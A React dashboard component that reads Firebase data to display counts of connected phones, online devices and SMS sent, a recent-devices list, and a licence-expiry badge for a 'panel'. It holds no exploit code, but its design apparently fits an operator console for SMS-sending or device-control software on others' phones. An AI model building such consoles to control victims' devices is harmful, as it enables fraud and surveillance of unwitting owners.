import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import {
  Smartphone, MessageSquare, Send, Wifi, WifiOff,
  TrendingUp, Crown, Star, Zap, Shield, Database
} from 'lucide-react'
import { useAuth } from '../context/AuthContext'
import { usePanel } from '../context/PanelContext'
import { db } from '../context/AuthContext'
import { ref, onValue, off, get } from 'firebase/database'
import { toast } from 'sonner'

const statCards = [
  { label: 'Total Devices', icon: Smartphone, color: 'text-blue-500', bg: 'bg-blue-500/10', key: 'totalDevices' },
  { label: 'Online Now', icon: Wifi, color: 'text-green-500', bg: 'bg-green-500/10', key: 'onlineDevices' },
  { label: 'Messages Today', icon: MessageSquare, color: 'text-purple-500', bg: 'bg-purple-500/10', key: 'messagesToday' },
  { label: 'SMS Sent', icon: Send, color: 'text-orange-500', bg: 'bg-orange-500/10', key: 'smsSent' },
]

export default function Dashboard() {
  const { user } = useAuth()
  const { config, isExpired, daysRemaining } = usePanel()
  const [stats, setStats] = useState({ totalDevices: 0, onlineDevices: 0, messagesToday: 0, smsSent: 0 })
  const [recentDevices, setRecentDevices] = useState([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    if (!db) { setLoading(false); return }

    const usersRef = ref(db, 'users')
    const sendsmsRef = ref(db, 'sendsms')
    let usersUnsub, smsUnsub

    const fetchStats = async () => {
      try {
        const [usersSnap, smsSnap] = await Promise.all([
          get(usersRef),
          get(sendsmsRef)
        ])

        const usersData = usersSnap.val() || {}
        const smsData = smsSnap.val() || {}

        const totalDevices = Object.keys(usersData).length
        const onlineDevices = Object.values(usersData).filter(d => d.online === true).length

        let messagesToday = 0
        let smsSent = 0
        const today = new Date()
        today.setHours(0, 0, 0, 0)
        const todayStart = today.getTime()

        Object.values(smsData).forEach(deviceSms => {
          Object.values(deviceSms || {}).forEach(msg => {
            if (msg.time && msg.time >= todayStart) {
              smsSent++
              if (msg.success) messagesToday++
            }
          })
        })

        setStats({ totalDevices, onlineDevices, messagesToday, smsSent })

        const recent = Object.entries(usersData)
          .sort((a, b) => (b[1].last_seen || 0) - (a[1].last_seen || 0))
          .slice(0, 5)
          .map(([id, data]) => ({ id, ...data }))
        setRecentDevices(recent)
      } catch (err) {
        console.error('Failed to fetch stats:', err)
      } finally {
        setLoading(false)
      }
    }

    fetchStats()

    usersUnsub = onValue(usersRef, fetchStats)
    smsUnsub = onValue(sendsmsRef, fetchStats)

    return () => {
      if (usersUnsub) off(usersRef, 'value', usersUnsub)
      if (smsUnsub) off(sendsmsRef, 'value', smsUnsub)
    }
  }, [])

  if (loading) {
    return (
      <div className="p-5 space-y-6">
        <div className="h-8 w-48 bg-secondary/50 rounded-xl animate-pulse" />
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {[1,2,3,4].map(i => (
            <div key={i} className="h-28 bg-secondary/50 rounded-2xl animate-pulse" />
          ))}
        </div>
        <div className="h-64 bg-secondary/50 rounded-2xl animate-pulse" />
      </div>
    )
  }

  return (
    <div className="p-5 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-black text-foreground">Dashboard</h1>
          <p className="text-sm text-muted-foreground mt-1">
            Welcome back, {config.admin_name || 'Admin'} • Panel status: {isExpired ? 'Expired' : 'Active'}
          </p>
        </div>
        <div className="flex items-center gap-2">
          {!isExpired && daysRemaining !== null && (
            <motion.div
              initial={{ scale: 0.8 }}
              animate={{ scale: 1 }}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-yellow-500/10 border border-yellow-500/20"
            >
              <Star className="h-4 w-4 text-yellow-500" />
              <span className="text-sm font-bold text-yellow-500">{daysRemaining}d remaining</span>
            </motion.div>
          )}
          {isExpired && (
            <div className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-destructive/10 border border-destructive/20">
              <Shield className="h-4 w-4 text-destructive" />
              <span className="text-sm font-bold text-destructive">Panel Expired</span>
            </div>
          )}
        </div>
      </div>

      {/* Stats Grid */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {statCards.map((card) => (
          <motion.div
            key={card.key}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 * statCards.indexOf(card) }}
            className="rounded-2xl border border-border bg-card p-5 hover:border-primary/30 transition-all"
          >
            <div className="flex items-center justify-between">
              <div>
                <p className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider">{card.label}</p>
                <p className="text-3xl font-black text-foreground mt-1">{stats[card.key] || 0}</p>
              </div>
              <div className={`h-12 w-12 rounded-xl flex items-center justify-center ${card.bg}`}>
                <card.icon className={`h-6 w-6 ${card.color}`} />
              </div>
            </div>
          </motion.div>
        ))}
      </div>

      {/* Recent Devices */}
      <div className="rounded-2xl border border-border bg-card overflow-hidden">
        <div className="p-5 border-b border-border flex items-center justify-between">
          <h2 className="text-lg font-black text-foreground">Recent Devices</h2>
          <span className="text-sm text-muted-foreground">{recentDevices.length} devices</span>
        </div>
        <div className="divide-y divide-border/50">
          {recentDevices.length === 0 ? (
            <div className="p-10 text-center">
              <Database className="h-12 w-12 text-muted-foreground/50 mx-auto mb-3" />
              <p className="text-muted-foreground">No devices connected yet</p>
            </div>
          ) : (
            recentDevices.map((device) => (
              <div key={device.id} className="p-4 hover:bg-secondary/30 transition-colors">
                <div className="flex items-center gap-3">
                  <div className="h-10 w-10 rounded-xl bg-primary/10 flex items-center justify-center">
                    <Smartphone className="h-5 w-5 text-primary" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="font-semibold text-foreground truncate">{device.brand} {device.model}</p>
                    <p className="text-[11px] text-muted-foreground font-mono truncate">{device.id}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className={`h-2 w-2 rounded-full ${device.online ? 'bg-green-500' : 'bg-muted-foreground'}`} />
                    <span className="text-[11px] font-medium">{device.online ? 'Online' : 'Offline'}</span>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  )
}
